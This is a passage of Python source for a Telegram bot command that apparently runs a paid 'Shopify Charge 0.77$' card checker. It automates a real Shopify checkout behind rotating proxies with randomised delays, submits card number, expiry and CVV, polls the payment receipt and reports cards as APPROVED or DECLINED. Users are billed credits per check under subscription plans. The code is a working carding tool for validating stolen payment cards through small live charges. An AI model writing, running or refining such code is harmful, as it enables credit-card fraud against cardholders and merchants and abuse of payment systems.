                "note": {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []},
                "nonNegotiableTerms": None,
                "scriptFingerprint": {
                    "signature": None,
                    "signatureUuid": None,
                    "lineItemScriptChanges": [],
                    "paymentScriptChanges": [],
                    "shippingScriptChanges": []
                },
                "optionalDuties": {"buyerRefusesDuties": False},
                "cartMetafields": []
            },
            "attemptToken": attempt_token,
            "metafields": [],
            "analytics": {
                "requestUrl": f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?_r={self.generate_random_string(20)}&auto_redirect=false&edge_redirect=true&skip_shop_pay=true",
                "pageId": self.generate_uuid().upper()
            }
        }
        
        payload = {
            "operationName": "SubmitForCompletion",
            "variables": variables,
            "id": self.submit_id
        }
        
        try:
            resp = await self.client.post(
                graphql_url + "?operationName=SubmitForCompletion",
                headers=graphql_headers,
                json=payload,
                timeout=25
            )
            
            if resp.status_code != 200:
                return False, f"Submit failed: {resp.status_code}"
            
            try:
                submit_resp = resp.json()
                
                if 'errors' in submit_resp and submit_resp['errors']:
                    error_msgs = []
                    for error in submit_resp['errors']:
                        error_code = error.get('code', 'UNKNOWN')
                        error_msgs.append(error_code)
                    return False, f"DECLINED - {', '.join(error_msgs)}"
                
                data = submit_resp.get('data', {}).get('submitForCompletion', {})
                receipt = data.get('receipt', {})
                self.receipt_id = receipt.get('id')
                
                if not self.receipt_id:
                    return False, "DECLINED - No receipt ID"
                
                self.logger.data_extracted("Receipt ID", self.receipt_id.split('/')[-1], "Submit")
                
                receipt_type = receipt.get('__typename', '')
                
                if receipt_type == 'ProcessingReceipt' or receipt_type == 'ProcessedReceipt':
                    poll_delay = receipt.get('pollDelay', 500) / 1000
                    self.step(8, "POLL RECEIPT", f"Waiting {poll_delay}s", f"Delay: {poll_delay}s", "WAIT")
                    await asyncio.sleep(poll_delay)
                    return await self.poll_receipt(graphql_headers)
                    
                elif receipt_type == 'FailedReceipt':
                    error_info = receipt.get('processingError', {})
                    error_code = error_info.get('code', 'GENERIC_ERROR')
                    error_msg = error_info.get('messageUntranslated', '')
                    if error_msg:
                        return False, f"DECLINED - {error_code}: {error_msg}"
                    return False, f"DECLINED - {error_code}"
                    
                else:
                    return False, f"Unknown receipt type: {receipt_type}"
                    
            except Exception as e:
                return False, f"Failed to parse submit response: {str(e)[:50]}"
                
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"Proxy error on submit: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return False, "PROXY_DEAD"
        except httpx.TimeoutException as e:
            self.logger.error_log("TIMEOUT", f"Timeout on submit: {str(e)}")
            return False, "TIMEOUT"
        except Exception as e:
            self.logger.error_log("SUBMIT_ERROR", str(e))
            return False, f"Submit error: {str(e)[:50]}"

    # ========== STEP 9: Poll For Receipt ==========
    async def poll_receipt(self, headers, max_polls=8):
        """Step 9: Poll for receipt status"""
        self.step(9, "POLL RECEIPT", "Polling for payment status")
        
        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
        poll_attempts = 0
        max_attempts = max_polls
        base_delay = 1.0
        
        while poll_attempts < max_attempts:
            poll_attempts += 1
            
            try:
                poll_variables = {
                    "receiptId": self.receipt_id,
                    "sessionToken": self.graphql_session_token
                }
                
                poll_payload = {
                    "operationName": "PollForReceipt",
                    "variables": poll_variables,
                    "id": self.poll_id
                }
                
                resp = await self.client.post(
                    graphql_url + "?operationName=PollForReceipt",
                    headers=headers,
                    json=poll_payload,
                    timeout=25
                )
                
                if resp.status_code != 200:
                    if poll_attempts < max_attempts:
                        await asyncio.sleep(base_delay * poll_attempts)
                        continue
                    return False, f"Poll failed: {resp.status_code}"
                
                try:
                    poll_resp = resp.json()
                    receipt_data = poll_resp.get('data', {}).get('receipt', {})
                    
                    receipt_type = receipt_data.get('__typename', '')
                    
                    if receipt_type == 'FailedReceipt':
                        error_info = receipt_data.get('processingError', {})
                        error_code = error_info.get('code', 'GENERIC_ERROR')
                        error_msg = error_info.get('messageUntranslated', '')
                        if error_msg:
                            return False, f"DECLINED - {error_code}: {error_msg}"
                        return False, f"DECLINED - {error_code}"
                        
                    elif receipt_type == 'ProcessedReceipt':
                        order_identity = receipt_data.get('orderIdentity', {})
                        order_id = order_identity.get('id', 'N/A')
                        self.logger.success_log("Payment processed successfully", f"Order: {order_id}")
                        return True, "ORDER_PLACED"
                        
                    elif receipt_type == 'ProcessingReceipt':
                        if poll_attempts < max_attempts:
                            poll_delay = receipt_data.get('pollDelay', 500) / 1000
                            wait_time = max(poll_delay, base_delay * poll_attempts)
                            self.logger.step(9, "POLL RECEIPT", f"Still processing, attempt {poll_attempts}/{max_attempts}", f"Waiting {wait_time:.1f}s", "WAIT")
                            await asyncio.sleep(wait_time)
                            continue
                        else:
                            return False, "DECLINED - PROCESSING_TIMEOUT"
                    
                    elif receipt_type == 'ActionRequiredReceipt':
                        # 3DS or other action required
                        return True, "APPROVED - 3DS_REQUIRED"
                    
                    else:
                        if poll_attempts < max_attempts:
                            await asyncio.sleep(base_delay)
                            continue
                        return False, f"Unknown receipt: {receipt_type}"
                        
                except Exception as e:
                    if poll_attempts < max_attempts:
                        await asyncio.sleep(base_delay)
                        continue
                    return False, f"Poll parse error: {str(e)[:50]}"
                    
            except httpx.TimeoutException as e:
                if poll_attempts < max_attempts:
                    await asyncio.sleep(base_delay)
                    continue
                return False, "TIMEOUT"
                
            except Exception as e:
                if poll_attempts < max_attempts:
                    await asyncio.sleep(base_delay)
                    continue
                return False, f"Poll error: {str(e)[:50]}"
        
        return False, "DECLINED - TIMEOUT"

    # ========== MAIN EXECUTION FLOW ==========
    async def execute_checkout(self, cc, mes, ano, cvv):
        """Main checkout execution flow with proper cookie chain"""
        try:
            # Step 0: Get proxy and initialize client
            self.step(0, "GET PROXY", "Getting proxy")
            
            if PROXY_SYSTEM_AVAILABLE:
                self.proxy_url = get_proxy_for_user(self.user_id, "random")
                if not self.proxy_url:
                    self.logger.error_log("NO_PROXY", "No working proxies available")
                    return False, "NO_PROXY_AVAILABLE"
                
                self.client = httpx.AsyncClient(proxy=self.proxy_url, timeout=30, follow_redirects=True)
                self.proxy_status = "Live ⚡️"
                self.proxy_used = True
                self.logger.data_extracted("Proxy", f"{self.proxy_url[:30]}...", "Proxy System")
            else:
                self.proxy_status = "No Proxy"
                self.client = httpx.AsyncClient(timeout=30, follow_redirects=True)
            
            # Step 0b: Initialize session (get initial cookies)
            success, result = await self.initialize_session()
            if not success:
                return False, result
            await self.random_delay(0.3, 0.5)
            
            # Step 1: Visit product page
            success, result = await self.visit_product_page()
            if not success:
                return False, result
            await self.random_delay(0.3, 0.5)
            
            # Step 2: Add to cart
            success, result = await self.add_to_cart()
            if not success:
                return False, result
            await self.random_delay(0.3, 0.5)
            
            # Step 3: Start checkout (POST /cart)
            success, result = await self.start_checkout()
            if not success:
                return False, result
            await self.random_delay(0.5, 0.8)
            
            # Step 4: Get checkout page & extract tokens
            success, result = await self.get_checkout_page()
            if not success:
                return False, result
            await self.random_delay(0.3, 0.5)
            
            # Step 5: Submit initial proposal with email
            success, result = await self.submit_initial_proposal()
            if not success:
                return False, result
            await self.random_delay(0.3, 0.5)
            
            # Step 6: Create PCI payment session
            success, payment_session_id = await self.create_payment_session(cc, mes, ano, cvv)
            if not success:
                return False, payment_session_id
            await self.random_delay(0.3, 0.5)
            
            # Step 7: Submit billing proposal with card BIN
            success, result = await self.submit_billing_proposal(cc, payment_session_id)
            if not success:
                return False, result
            await self.random_delay(0.3, 0.5)
            
            # Step 8: Submit for completion + poll
            success, result = await self.submit_for_completion(cc, payment_session_id)
            
            return success, result
            
        except Exception as e:
            self.logger.error_log("UNKNOWN", f"Checkout error: {str(e)}")
            return False, f"Checkout error: {str(e)[:50]}"
        finally:
            if self.client:
                await self.client.aclose()


# ========== MAIN CHECKER CLASS ==========
class ShopifyMiddleEasternChecker:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.logger = ShopifyLogger(user_id)
        self.proxy_status = "Dead 🚫"

    async def check_card(self, card_details, username, user_data):
        """Main card checking method"""
        start_time = time.time()

        self.logger = ShopifyLogger(self.user_id)
        self.logger.start_check(card_details)

        try:
            # Parse card
            cc, mes, ano, cvv = parse_card_input(card_details)
            
            if not cc or not mes or not ano or not cvv:
                elapsed_time = time.time() - start_time
                self.logger.error_log("INVALID_FORMAT", f"Could not parse card from: {card_details[:100]}...")
                return format_shopify_response("", "", "", "", "Invalid card format - could not extract CC details", elapsed_time, username, user_data, self.proxy_status)

            if len(cc) < 15 or len(cc) > 19:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid card number length", elapsed_time, username, user_data, self.proxy_status)

            if not (1 <= int(mes) <= 12):
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid month", elapsed_time, username, user_data, self.proxy_status)

            if len(cvv) not in [3, 4]:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid CVV", elapsed_time, username, user_data, self.proxy_status)

            self.logger.card_details_log(cc, mes, ano, cvv)

            # Create checker and execute
            checker = ShopifyMiddleEasternCheckout(self.user_id)
            success, result = await checker.execute_checkout(cc, mes, ano, cvv)
            
            self.proxy_status = checker.proxy_status

            elapsed_time = time.time() - start_time

            if success:
                self.logger.complete_result(True, "APPROVED", result, elapsed_time)
            else:
                self.logger.complete_result(False, "DECLINED", result, elapsed_time)

            return format_shopify_response(cc, mes, ano, cvv, result, elapsed_time, username, user_data, self.proxy_status)

        except Exception as e:
            elapsed_time = time.time() - start_time
            self.logger.error_log("UNKNOWN", str(e))
            try:
                parsed_cc, parsed_mes, parsed_ano, parsed_cvv = parse_card_input(card_details)
                if parsed_cc:
                    cc, mes, ano, cvv = parsed_cc, parsed_mes, parsed_ano, parsed_cvv
                else:
                    cc = mes = ano = cvv = ""
            except:
                cc = mes = ano = cvv = ""
            error_msg = str(e)
            if ":" in error_msg:
                error_msg = error_msg.split(":")[0].strip()
            return format_shopify_response(cc, mes, ano, cvv, f"UNKNOWN_ERROR: {error_msg[:30]}", elapsed_time, username, user_data, self.proxy_status)


# ========== COMMAND HANDLER ==========
@Client.on_message(filters.command(["sf", ".sf", "$sf"]))
@auth_and_free_restricted
async def handle_shopify_middle_eastern(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        if is_user_banned(user_id):
            await message.reply("""<pre>⚠️ User Banned</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You have been banned from using this bot.
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>📝 Registration Required</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You need to register first with /register
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        can_use, wait_time = check_cooldown(user_id, "si")
        if not can_use:
            await message.reply(f"""<pre>⏱️ Cooldown Active</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
🠪 <b>Your Plan:</b> <code>{plan_name}</code>
🠪 <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        args = message.text.split()
        if len(args) < 2:
            await message.reply("""<pre>#WAYNE ━[SHOPIFY CHARGE 0.77$]━━</pre>
━━━━━━━━━━━━━
🠪 <b>Command</b>: <code>/sf</code>
🠪 <b>Usage</b>: <code>/sf [card details]</code>
🠪 <b>Examples</b>:
   • <code>/sf 4111111111111112|12|2030|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Shopify Charge 0.77$</code>""")
            return

        card_details = ' '.join(args[1:])

        cc, mes, ano, cvv = parse_card_input(card_details)
        if not cc or not mes or not ano or not cvv:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Could not extract valid card information.
🠪 <b>Example:</b> <code>/sf 4111111111111111|12|2030|123</code>
━━━━━━━━━━━━━""")
            return

        processing_msg = await message.reply(
            f"""
<b>[#Shopify Charge 0.77$] | #WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 0.77$</b>
<b>[•] Status</b>- <code>Processing...</code>
<b>[•] Response</b>- <code>Initiating...</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {plan_name}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Processing... Please wait.</b>
"""
        )

        checker = ShopifyMiddleEasternChecker(user_id)

        if CHARGE_PROCESSOR_AVAILABLE and charge_processor:
            try:
                result = await charge_processor.execute_charge_command(
                    user_id,
                    checker.check_card,
                    card_details,
                    username,
                    user_data,
                    credits_needed=1,
                    command_name="si",
                    gateway_name="Shopify Charge 0.77$"
                )

                if isinstance(result, tuple) and len(result) == 3:
                    success, result_text, credits_deducted = result
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                elif isinstance(result, str):
                    await processing_msg.edit_text(result, disable_web_page_preview=True)
                else:
                    result_text = await checker.check_card(card_details, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)

            except Exception as e:
                print(f"❌ Charge processor error: {str(e)}")
                try:
                    result_text = await checker.check_card(card_details, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                except Exception as inner_e:
                    await processing_msg.edit_text(
                        f"""<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: <code>{str(inner_e)[:100]}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━"""
                    )
        else:
            try:
                result_text = await checker.check_card(card_details, username, user_data)
                await processing_msg.edit_text(result_text, disable_web_page_preview=True)
            except Exception as e:
                await processing_msg.edit_text(
                    f"""<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: <code>{str(e)[:100]}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━"""
                )

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: An error occurred while processing your request.
🠪 <b>Error</b>: <code>{error_msg}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.

━━━━━━━━━━━━━""")
